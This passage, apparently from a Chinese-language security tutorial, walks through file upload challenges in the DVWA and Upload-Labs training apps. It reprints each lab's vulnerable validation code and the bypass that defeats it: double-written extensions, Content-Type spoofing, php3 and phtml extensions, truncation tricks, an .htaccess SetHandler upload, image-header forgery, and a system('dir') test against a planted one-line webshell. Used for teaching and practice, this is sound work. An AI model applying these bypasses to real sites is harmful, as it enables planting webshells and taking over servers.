class="string">""</span>, $name);</span><br></pre></td></tr></table></figure><p>这种情况一般都可以进行双写绕过：上传的文件名为<code>shell.pphphp</code>，那么被替换之后就为<code>shell.php</code></p><h1 id="DVWA-文件上传"><a href="#DVWA-文件上传" class="headerlink" title="DVWA 文件上传"></a>DVWA 文件上传</h1><h2 id="File-Upload-LOW"><a href="#File-Upload-LOW" class="headerlink" title="File Upload LOW"></a>File Upload LOW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        $html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有任何过滤直接上传</p><h2 id="File-Upload-Medium"><a href="#File-Upload-Medium" class="headerlink" title="File Upload Medium"></a>File Upload Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            $html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            $html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只校验了 Content-Type：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br></pre></td></tr></table></figure><h2 id="File-Upload-High"><a href="#File-Upload-High" class="headerlink" title="File Upload High"></a>File Upload High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            $html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            $html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>白名单很严格，基本无法绕过</p></blockquote><h3 id="PHP-strrpos-函数"><a href="#PHP-strrpos-函数" class="headerlink" title="PHP strrpos() 函数"></a><strong>PHP strrpos() 函数</strong></h3><p>查找字符串在另一字符串中最后一次出现的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strrpos(string,find,start)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">必需。规定被搜索的字符串。</td></tr><tr><td style="text-align:left"><em>find</em></td><td style="text-align:left">必需。规定要查找的字符。</td></tr><tr><td style="text-align:left"><em>start</em></td><td style="text-align:left">可选。规定在何处开始搜索。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strrpos(<span class="string">"You love php, I love php too!"</span>,<span class="string">"php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP-getimagesize-函数"><a href="#PHP-getimagesize-函数" class="headerlink" title="PHP getimagesize()函数"></a><strong>PHP getimagesize()函数</strong></h3><p>用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>利用思路主要是：绕过<code>getimagesize()</code>函数检测识别和上传文件名的检测识别。</p><p>让<code>getimagesize()</code>函数检测无效的方法：文件头欺骗，继而使得<code>getimagesize()</code>函数无法判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;h1&gt;图片&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$image = getimagesize(<span class="string">"imgs/php.png"</span>);</span><br><span class="line">print_r($image);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;木马&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = getimagesize(<span class="string">"imgs/shell.png"</span>);</span><br><span class="line">print_r($shell);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="Upload-Labs-文件上传"><a href="#Upload-Labs-文件上传" class="headerlink" title="Upload Labs 文件上传"></a>Upload Labs 文件上传</h1><p><strong>项目地址</strong>：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><p>运行phpstudy前要先运行<code>modify_path.bat</code></p><blockquote><p>hackbar 插件 <code>x=system（&#39;dir&#39;）;</code>验证传是否成功,x为一句话密码</p></blockquote><h2 id="第1关-前端js绕过"><a href="#第1关-前端js绕过" class="headerlink" title="第1关 前端js绕过"></a>第1关 前端js绕过</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><ul><li>前端禁用js</li><li>抓包绕过</li></ul><h2 id="第2关-content-type"><a href="#第2关-content-type" class="headerlink" title="第2关 content-type"></a>第2关 content-type</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="第3关-php3-phtml"><a href="#第3关-php3-phtml" class="headerlink" title="第3关 php3 phtml"></a>第3关 php3 phtml</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>deny_ext 黑名单判断，于是尝试用php3,phtml绕过</p><p>apache httpd.conf进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure><p>在文件上传时，我们往往会考虑到文件名截断，如%00 等..</p><p>可能还会用冒号(“:”)去截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.php:jpg</span><br></pre></td></tr></table></figure><p>冒号截断产生的文件是空白的，里面并不会有任何的内容</p><p>会写入一个<code>3.php</code>的空文件</p><p><code>&lt;</code> 就等于 <code>**</code>,而<code>*</code>代码任意字符，于是乎可以这样修改上传的文件名，如下：</p><p>然后修改名字为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.&lt;&lt;&lt;</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="第4关-htaccess"><a href="#第4关-htaccess" class="headerlink" title="第4关 .htaccess"></a>第4关 .htaccess</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>然后随便上传一个后缀都会解析为php</p><h2 id="第5关-大小写"><a href="#第5关-大小写" class="headerlink" title="第5关 大小写"></a>第5关 大小写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span 